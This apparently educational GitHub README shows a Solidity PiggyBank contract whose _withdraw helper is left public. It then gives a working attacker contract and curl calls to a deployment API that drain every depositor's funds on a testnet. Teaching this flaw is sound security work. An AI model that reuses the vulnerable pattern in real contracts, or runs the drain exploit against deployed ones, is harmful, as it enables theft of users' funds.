# Internal-External-Public-vulnerability-in-smart-contracts
Example of exploiting vulnerability - bad use of internal external public in solidity smart contracts

PiggyBank is a basic smart contract allowing multiple deposits from any address, and a withdraw of all deposited funds in one transaction.
This is basic functionality and easy to understand, but...
The programmer forgot to annotate the _withdraw function of the smart contract with "internal" modificator, so any malicious actor can hack the smart contract and stole the funds.
Steps to reproduce:

1. Deploy [VulnerablePiggyBank.sol](VulnerablePiggyBank.sol) 

```csharp
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerablePiggyBank {
    mapping(address => uint) public balances;
    event WithdrawEvent(address,uint);

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public payable {
        uint balance = balances[msg.sender];
        require(balance > 0, "Insufficient balance");
        balances[msg.sender] =0;
        // Transfer balance using a reusable _withdraw function 
        _withdraw(msg.sender,balance);
    }

    //should be internal!!
    function _withdraw(address toAddress, uint balance) public {
        payable(toAddress).transfer(balance);
        emit WithdrawEvent(toAddress,balance);
    }
    
}
```
We can deploy the smart contract from our Vottun API Dashboard, registering and deploying an instance:
![image](https://github.com/user-attachments/assets/1f0106da-86db-46a8-9fc8-bb928b5f2efc)
After deploying in Polygon Amoy testnet, we can see the address of deployed smart contract:
![image](https://github.com/user-attachments/assets/3daf1b90-1b94-4b22-822e-3526af75cf8a)



2. Do some deposits for one or more addresses, by interacting with the smart contract. The VulnerablePiggyBank smart contract stores the funds internally, and get account of balance on every address.
We can use mutable endpoint of Vottun APIs for doing such transaction, as in this example(with curl, but you could try postman also), for deposit 1 MATIC:
```
curl --location 'https://api.vottun.tech/core/v1/evm/transact/mutable' \
--header 'x-application-vkn: XXX' \
--header 'Content-Type: application/json' \
--header 'Authorization: Bearer XXX' \
--data '{
    "contractAddress": "0x59C48A84b63FFb25c1B3280fc5468b2715aEDB28",
    "sender": "0x7590a8ff8a4b8e2831db16a02f03c7acd65aca26",
    "blockchainNetwork": 80002,
    "method": "deposit",
    "params": [
    ],
    "value":1
}'
```
You can see the example txn [here](https://www.oklink.com/amoy/tx/0xa5bb80b1182101fbe6eb81701a329e057e45a1bdcc61dc35f5131e83ba360384).
At this point, users could do a clean withdraw of their funds ...but before any of the participating addresses do withdraw, a malicious actor appears, doing the following steps:

3. Deploy [UsingVulnerablePiggyBank.sol](UsingVulnerablePiggyBank.sol) smart contract, that uses the vulnerable contract. When deploy, you must pass the address of VulnerablePiggyBank smart contract to constructor. That's the address of smart contract already deployed in step 1.
```csharp
contract UsingVulnerablePiggyBank {

    VulnerablePiggyBank _piggyBank;

    constructor(address piggyBank){
        _piggyBank = VulnerablePiggyBank(piggyBank);
    }
  
    function vulnerate(address to) public{
        uint etherInVulnerableContract = address(_piggyBank).balance;
        _piggyBank._withdraw(to,etherInVulnerableContract);
    }
}
```
Again used API Vottun dashboard to register and deploy the smart contract. Deployed on polygon Amoy testnet:
![image](https://github.com/user-attachments/assets/9fc33603-3f67-4def-b286-02c34f9f3314)


4. The malicious actor do a transaction to call the vulnerate() function of UsingVulnerablePiggyBank smart contract, which internally calls function VulnerablePiggyBank._withdraw(), that should be "internal" and got deployed "public" by error. Invoking vulnerate() method can be done with Vottun APIs, using mutable endpoint:
```
curl --location 'https://api.vottun.tech/core/v1/evm/transact/mutable' \
--header 'x-application-vkn: XXX' \
--header 'Content-Type: application/json' \
--header 'Authorization: Bearer XXX' \
--data '{
    "contractAddress": "0xAC07D9F60F16861E2a65a1DC386a89Ccec397304",
    "sender": "0x7590a8ff8a4b8e2831db16a02f03c7acd65aca26",
    "blockchainNetwork": 80002,
    "method": "vulnerate",
    "params": [
        "0x7590a8ff8a4b8e2831db16a02f03c7acd65aca26"
    ]
}'
```
6. By executing vulnerate() function, the malicious actor adquires all the funds in the vulnerable smart contract, draining the funds of all users. You can see the txn used as example [here](https://www.oklink.com/amoy/tx/0x5be9b7486a1c77c026fe8d1fd553a21e1d19dee0889bfb2fc8a79809d5f48ad7). 
   

  
 
    
